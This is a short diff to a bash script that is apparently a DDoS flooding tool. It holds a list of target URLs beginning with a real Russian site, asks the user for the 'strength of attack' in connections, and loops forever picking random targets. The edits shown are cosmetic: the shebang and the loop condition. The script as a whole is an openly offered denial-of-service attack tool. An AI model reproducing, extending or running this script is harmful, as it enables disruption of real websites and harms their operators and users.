@@ -1,4 +1,4 @@
-#!/bin/bash -x
+#!/usr/bin/env bash
 
 DESTS=(
 "https://ddos-guard.net/ru"
@@ -60,7 +60,7 @@ ARR_LENGTH=${#DESTS[@]}
 
 read -p 'Enter the strength of attack. 1 - 20+, depending on you internet speed:' CONNECTIONS
 
-while TRUE
+while :
 do
     RANDOMNUM=$((RANDOM % ARR_LENGTH ))
     DEST=${DESTS[$RANDOMNUM]}
